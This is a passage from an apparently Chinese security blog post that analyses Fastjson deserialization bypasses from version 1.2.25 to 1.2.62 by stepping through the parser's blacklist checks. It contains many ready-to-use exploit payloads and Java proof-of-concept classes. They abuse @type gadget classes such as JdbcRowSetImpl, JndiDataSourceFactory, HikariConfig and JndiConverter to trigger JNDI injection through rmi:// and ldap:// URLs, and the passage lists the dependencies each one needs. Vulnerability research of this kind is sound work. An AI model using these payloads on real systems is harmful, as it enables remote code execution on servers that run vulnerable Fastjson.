title="调试"></a>调试</h3><p>在进行检测之前，会先对LLcom.sun.rowset.JdbcRowSetImpl;;过滤掉一次L和;，因此可以双写，是的过滤掉一次之后任然可以绕过黑名单检测。</p><p><img src="/../../pict/image-20240619041911836.png" alt="image-20240619041911836"></p><p>然后进入TypeUtils#loadClass方法，传入的参数还是LLcom.sun.rowset.JdbcRowSetImpl;;，那为什么可以加载com.sun.rowset.JdbcRowSetImpl呢。</p><p><img src="/../../pict/image-20240619042209460.png" alt="image-20240619042209460"></p><p>可以看到<code>TypeUtils#loadClass</code>中会过滤掉<code>L</code>和<code>;</code>然后加载类，但是注意我们进入的是<code>TypeUtils</code>重写的<code>loadClass</code>，通过这个<code>loadClass</code>有来到了一次原来的<code>loadClass</code>，比如<code>loadClassA</code>里面过滤一次<code>L</code>和<code>;</code>，然后调用了<code>loadClassB</code>，通过<code>loadClassB</code>再次调用了<code>loadClassA</code>，在第二次<code>loadClassA</code>又会过滤一次。过滤完之后又会重复一次什么操作，这是第三次我们检查不到<code>L</code>和<code>;</code>于是可以正常加载<code>com.sun.rowset.JdbcRowSetImpl</code>类了。</p><p><img src="/../../pict/image-20240619042339972.png" alt="image-20240619042339972"></p><h2 id="1-2-25-1-2-43-补丁绕过（需要开启AutoType）"><a href="#1-2-25-1-2-43-补丁绕过（需要开启AutoType）" class="headerlink" title="1.2.25-1.2.43 补丁绕过（需要开启AutoType）"></a>1.2.25-1.2.43 补丁绕过（需要开启AutoType）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span>, <br><span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br><br>&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>, <br><span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h3><p>来到checkAutoType函数，这里的className是我们的@type，不过会先讲$替换成<code>.</code>，这里有个if判断，大概自己试了一下，第一个if判断了是否是L开头;结尾的类名，第二次就是判断是否是LL开头的类名，满足第一个if不满足第二个if就把开头的L和结尾的;去掉然后再去后续操作，满足两个if直接抛出异常。</p><p><img src="/../../pict/image-20240621174551447.png" alt="image-20240621174551447"></p><p>接着就是白名单和黑名单校验了。不过都是用字符串的哈希值校验</p><p><img src="/../../pict/image-20240621175900559.png" alt="image-20240621175900559"></p><p>在TypeUtils.loadClass函数中，经过这个函数过后，我们可以加载出来clazz，所以跟进去看看是怎么加载的。</p><p><img src="/../../pict/image-20240621180338814.png" alt="image-20240621180338814"></p><p>跟到1196行，发现会判断第一个字符是否是<code>[</code>，然后就会将这个符号去掉再加载类，然后我们就加载出了<code>com.sun.rowset.JdbcRowSetImpl</code>，然后通过<code>Array.newInstance(componentType, 0).getClass();</code>这个函数获取返回类。返回的类名是<code>[Lcom.sun.rowset.JdbcRowSetImpl;</code></p><p><img src="/../../pict/image-20240621180912367.png" alt="image-20240621180912367"></p><p>接着就去获取该类的反序列化器，然后调用方法去反序列化</p><p><img src="/../../pict/image-20240621181658324.png" alt="image-20240621181658324"></p><p>然后我们加载的类会赋值给clazz然后通过getComponentType函数得到了com.sun.rowset.JdbcRowSetImpl类。然后调用DefaultJsonParser#parseArray方法。</p><p><img src="/../../pict/image-20240621181902647.png" alt="image-20240621181902647"></p><p>里面会有一些判断字符后面内容是否是<code>[ </code>，<code>&#123;</code>的操作，所以我们的payload需要加上<code>[&#123;</code>。</p><p><img src="/../../pict/image-20240621182831496.png" alt="image-20240621182831496"></p><p><img src="/../../pict/image-20240621183006985.png" alt="image-20240621183006985"></p><h2 id="1-2-25-1-2-45补丁绕过（需要开启AutoType）"><a href="#1-2-25-1-2-45补丁绕过（需要开启AutoType）" class="headerlink" title="1.2.25-1.2.45补丁绕过（需要开启AutoType）"></a>1.2.25-1.2.45补丁绕过（需要开启AutoType）</h2><p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>      &lt;dependency&gt;<br>          &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>          &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>          &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.45</span>&lt;/version&gt;<br>      &lt;/dependency&gt;<br>      &lt;dependency&gt;<br>          &lt;groupId&gt;org.mybatis&lt;/groupId&gt;<br>          &lt;artifactId&gt;mybatis&lt;/artifactId&gt;<br>          &lt;version&gt;<span class="hljs-number">3.4</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>      &lt;/dependency&gt;<br>  &lt;/dependencies&gt;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<br><span class="hljs-string">&quot;properties&quot;</span>:<br>&#123;<br><span class="hljs-string">&quot;data_source&quot;</span>:<span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span><br>&#125;<br>&#125;<br>或<br>&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<br><span class="hljs-string">&quot;properties&quot;</span>:<br>&#123;<br><span class="hljs-string">&quot;data_source&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>fastjson1.2.46黑名单就加入了该类。</p><h3 id="调试分析-3"><a href="#调试分析-3" class="headerlink" title="调试分析"></a>调试分析</h3><p>可以看到相比于上个版本，这里会校验className第一个字符是否是<code>[</code>，h1后面有个L表示是长整型。</p><p><img src="/../../pict/image-20240621191111607.png" alt="image-20240621191111607"></p><p>校验部分肯定可以过得，因为此时黑名单还没有这个类。我们payload设置了properties这个参数，并且这个类是有setProperties方法的，且满足条件，所以会自动调用。</p><p><img src="/../../pict/image-20240621191436696.png" alt="image-20240621191436696"></p><p>这里就是熟悉的JNDI注入漏洞了，即<code>InitialContext.lookup()</code>，其中参数由我们输入的properties属性中的data_source值获取的，然后就是jndi注入的部分了。</p><p><img src="/../../pict/image-20240621191946941.png" alt="image-20240621191946941"></p><h2 id="1-2-25-1-2-47补丁绕过（无需开启AutoType）"><a href="#1-2-25-1-2-47补丁绕过（无需开启AutoType）" class="headerlink" title="1.2.25-1.2.47补丁绕过（无需开启AutoType）"></a>1.2.25-1.2.47补丁绕过（无需开启AutoType）</h2><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span>  <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span><br>                + <span class="hljs-string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span><br>                + <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;a&quot;</span>: &#123;<br><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br><span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>&#125;,<br><span class="hljs-string">&quot;b&quot;</span>: &#123;<br><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span>,<br><span class="hljs-string">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>或<br>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: &#123;<br><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br><span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>&#125;,<br><span class="hljs-string">&quot;b&quot;</span>: &#123;<br><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>,<br><span class="hljs-string">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p><h3 id="不受AutoTypeSupport影响的版本"><a href="#不受AutoTypeSupport影响的版本" class="headerlink" title="不受AutoTypeSupport影响的版本"></a>不受AutoTypeSupport影响的版本</h3><p>不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。</p><h4 id="未开启AutoTypeSupport时"><a href="#未开启AutoTypeSupport时" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>第一次在调用<code>checkAutoType</code>的时候，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回</p><p><img src="/../../pict/image-20240621203100768.png" alt="image-20240621203100768"></p><p>接着调用了MiscCodec#deserialze函数。</p><p><img src="/../../pict/image-20240621203411294.png" alt="image-20240621203411294"></p><p>判断键是否为”val”，是的话就会提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量</p><p><img src="/../../pict/image-20240621204350838.png" alt="image-20240621204350838"></p><p>接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类：</p><p><img src="/../../pict/image-20240621204510782.png" alt="image-20240621204510782"></p><p>在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中：</p><p><img src="/../../pict/image-20240621204706910.png" alt="image-20240621204706910"></p><p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测</p><p><img src="/../../pict/image-20240621205927034.png" alt="image-20240621205927034"></p><h4 id="开启AutoTypeSupport时"><a href="#开启AutoTypeSupport时" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><p>在第一部分JSON数据的扫描解析中，由于<code>@type</code>指向<code>java.lang.Class</code>，因此即使是开启<code>AutoTypeSupport</code>先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类：</p><p>关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类<code>com.sun.rowset.JdbcRowSetImpl</code>，其中的”com.sun.”是在denyList黑名单中的，但是为何在检测时能成功绕过呢？</p><p>我们调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (Arrays.binarySearch(denyHashCodes, <span class="hljs-built_in">hash</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span>) &#123;<br></code></pre></td></tr></table></figure><p>第一个判断条件<code>Arrays.binarySearch(denyHashCodes, hash) &gt;= 0</code>是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，这里由于前面已经将<code>com.sun.rowset.JdbcRowSetImpl</code>类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。</p><p><img src="/../../pict/image-20240621210325105.png" alt="image-20240621210325105"></p><h3 id="受AutoTypeSupport影响的版本"><a href="#受AutoTypeSupport影响的版本" class="headerlink" title="受AutoTypeSupport影响的版本"></a>受AutoTypeSupport影响的版本</h3><p>受AutoTypeSupport影响的版本为1.2.25-1.2.32，本次调试的是1.2.25版本。</p><h4 id="未开启AutoTypeSupport时-1"><a href="#未开启AutoTypeSupport时-1" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>与前面分析差不多</p><h4 id="开启AutoTypeSupport时-1"><a href="#开启AutoTypeSupport时-1" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><p>少了个判断条件，即<code>TypeUtils.getClassFromMapping(typeName) == null</code>，从而无法绕过黑名单检测，导致检测到<code>com.sun.rowset.JdbcRowSetImpl</code>这个黑名单中的类抛出异常。</p><p><img src="/../../pict/image-20240621210940647.png" alt="image-20240621210940647"></p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>将下面的true改成false，防止将<code>com.sun.rowset.JdbcRowSetImpl</code>添加进map缓存里。从而无法使用<code>TypeUtils.getClassFromMapping()</code>来加载</p><p><img src="/../../pict/image-20240622035455611.png" alt="image-20240622035455611"></p><p><img src="/../../pict/image-20240622035621233.png" alt="image-20240622035621233"></p><h2 id="1-2-5-1-2-61-通杀"><a href="#1-2-5-1-2-61-通杀" class="headerlink" title="1.2.5 - 1.2.61 通杀"></a>1.2.5 - 1.2.61 通杀</h2><h3 id="Fastjson1-2-5"><a href="#Fastjson1-2-5" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.59"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.59</h3><p><strong>需要开启AutoType</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;healthCheckRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-1"><a href="#Fastjson1-2-5-1" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.60"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.60</h3><p><strong>需要开启 autoType：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="hljs-string">&quot;xaDataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/ExportObject&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="hljs-string">&quot;prefix&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1099/ExportObject&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-2"><a href="#Fastjson1-2-5-2" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.61"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.61</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="hljs-string">&quot;jndiName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>,<span class="hljs-string">&quot;Object&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-62反序列化漏洞（黑名单绕过）"><a href="#1-2-62反序列化漏洞（黑名单绕过）" class="headerlink" title="1.2.62反序列化漏洞（黑名单绕过）"></a>1.2.62反序列化漏洞（黑名单绕过）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>新Gadget绕过黑名单限制。</p><p>org.apache.xbean.propertyeditor.JndiConverter类的toObjectImpl()函数存在JNDI注入漏洞，可由其构造函数处触发利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span>  <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-string">&quot;AsText&quot;</span>:<span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>需要开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.62；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>目标服务端需要存在xbean-reflect包；</li></ul><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.62<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="调试分析-4"><a href="#调试分析-4" class="headerlink" title="调试分析"></a>调试分析</h3><h4 id="未开启AutoTypeSupport时（无法触发漏洞）"><a href="#未开启AutoTypeSupport时（无法触发漏洞）" class="headerlink" title="未开启AutoTypeSupport时（无法触发漏洞）"></a>未开启AutoTypeSupport时（无法触发漏洞）</h4><p>因为是未开启AutoTypeSupport，先黑名单检测，再白名单检测。前面先进行一些检查，比如之前版本绕过检测的[等字符，会检查一遍。然后950行不会进去，因为我们没有开启AutoTypeSupport</p><p><img src="/../../pict/image-20240622044843596.png" alt="image-20240622044843596"></p><p>接着会尝试一系列方法进行类加载，从Mapping缓存中加载，调用findClass()来加载，从typeMapping中获取，判断是在internalWhite即内部哈希白名单中，则直接加载。这些加载全都失败，clazz任然为null。</p><p><img src="/../../pict/image-20240622044956115.png" alt="image-20240622044956115"></p><p>接着黑白名单校验，这个类这个fastjson版本不在黑名单中，所以不会被拦截，当然也不再白名单，任然无法加载</p><p><img src="/../../pict/image-20240622045233340.png" alt="image-20240622045233340"></p><p>接下来会对其是否开启AutoType、是否注解JsonType、是否设置expectClass来进行判断，如果判断通过，就会判断是否开启AutoType或是否注解JsonType，是的话就会在加载clazz后将其缓存到Mappings中，这正是1.2.47的利用点，也就是说，只要开启了AutoType或者注解了JsonType的话，在这段代码逻辑中就会把clazz缓存到Mappings中，但我们JsonType为false，AutoType也没有开启，无法缓存。</p><p><img src="/../../pict/image-20240622045604515.png" alt="image-20240622045604515"></p><p>然后抛出异常，所以未开启AutoTypeSupport时，无法触发漏洞。</p><p><img src="/../../pict/image-20240622050004619.png" alt="image-20240622050004619"></p><h4 id="开启AutoTypeSupport时（触发漏洞）"><a href="#开启AutoTypeSupport时（触发漏洞）" class="headerlink" 